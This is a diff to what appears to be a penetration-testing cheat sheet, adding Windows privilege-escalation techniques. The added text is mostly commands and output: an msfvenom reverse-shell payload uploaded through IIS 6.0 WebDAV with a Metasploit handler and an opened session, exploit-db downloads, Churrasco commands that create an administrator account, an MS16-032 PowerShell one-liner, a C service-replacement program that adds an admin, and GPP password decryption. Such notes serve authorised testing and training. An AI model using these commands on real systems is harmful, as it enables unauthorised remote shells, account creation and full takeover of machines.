@@ -719,6 +719,14 @@ runas /user:**domain\user** cmd.exe
 13. Scheduled Tasks
 
 ## Windows PE methods
+0. Quick Wins
+-   Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group:  
+    `whoami` 
+    `net user "%username%"`
+
+-   Try the getsystem command using meterpreter - rarely works but is worth a try
+    `meterpreter > getsystem`
+
 1. Scheduled Task/Job
 - Detection 1a: WinPEAS (under scheduled task), ensure that `scheduled task state = enabled` and `schedule type = daily` and `repeat every = 5 min` e.g.), `Author: NT AUTHORITY\SYSTEM or administrative user`
 - Detection 1b: `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe` ->  to check that non-administrative user can (W) or (F) to modify BackendCacheCleanup.exe at the directory.
@@ -925,6 +933,114 @@ return TRUE;
 
 - Exploitation: restart dll service using `sc stop dllsvc & sc start dllsvc`
 - Check if successful using: `net user user` -> shows Local Group Memberships as Administrators
+
+ ### MISC vectors
+ -   Windows Server 2003 and IIS 6.0 WEBDAV Exploiting
+http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html
+
+         msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt
+
+         cadavar http://$ip
+         dav:/> put aspshell.txt
+         Uploading aspshell.txt to `/aspshell.txt':
+         Progress: [=============================>] 100.0% of 38468 bytes succeeded.
+         dav:/> copy aspshell.txt aspshell3.asp;.txt
+         Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
+         dav:/> exit
+
+         msf > use exploit/multi/handler
+         msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+         msf exploit(handler) > set LHOST 1.2.3.4
+         msf exploit(handler) > set LPORT 80
+         msf exploit(handler) > set ExitOnSession false
+         msf exploit(handler) > exploit -j
+
+         curl http://$ip/aspshell3.asp;.txt
+
+         [*] Started reverse TCP handler on 1.2.3.4:443 
+         [*] Starting the payload handler...
+         [*] Sending stage (957487 bytes) to 1.2.3.5
+         [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700
+
+-   Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.
+
+         pip install pyinstaller
+         wget -O exploit.py http://www.exploit-db.com/download/31853  
+         python pyinstaller.py --onefile exploit.py
+
+-   Windows Server 2003 and IIS 6.0 privledge escalation using impersonation: 
+
+      https://www.exploit-db.com/exploits/6705/
+   
+      https://github.com/Re4son/Churrasco
+      
+         c:\Inetpub>churrasco
+         churrasco
+         /churrasco/-->Usage: Churrasco.exe [-d] "command to run"
+
+         c:\Inetpub>churrasco -d "net user /add <username> <password>"
+         c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
+         c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
+
+-   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
+    
+          python pyinstaller.py --onefile ms11-080.py  
+          mx11-080.exe -O XP
+    
+-   Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.  Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:
+
+      MS16-032 https://www.exploit-db.com/exploits/39719/
+      
+      `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`
+
+-   Windows Service Configuration Viewer - Check for misconfigurations
+    in services that can lead to privilege escalation. You can replace
+    the executable with your own and have windows execute whatever code
+    you want as the privileged user.  
+    icacls scsiaccess.exe
+
+         scsiaccess.exe  
+         NT AUTHORITY\SYSTEM:(I)(F)  
+         BUILTIN\Administrators:(I)(F)  
+         BUILTIN\Users:(I)(RX)  
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
+         Everyone:(I)(F)
+
+-   Compile a custom add user command in windows using C  
+
+      ```
+      root@kali:~# cat useradd.c  
+      #include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
+      int main ()  
+      {  
+      int i;  
+      i=system ("net localgroup administrators low /add");  
+      return 0;  
+      }
+      ```  
+
+      `i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`
+
+-   Group Policy Preferences (GPP)  
+    A common useful misconfiguration found in modern domain environments
+    is unprotected Windows GPP settings files
+
+    -   map the Domain controller SYSVOL share  
+        
+        `net use z:\\dc01\SYSVOL`
+
+    -   Find the GPP file: Groups.xml  
+        
+        `dir /s Groups.xml`
+
+    -   Review the contents for passwords  
+        
+        `type Groups.xml`
+
+    -   Decrypt using GPP Decrypt  
+        
+        `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
+        
 
 # Linux Priv Esc
 - https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
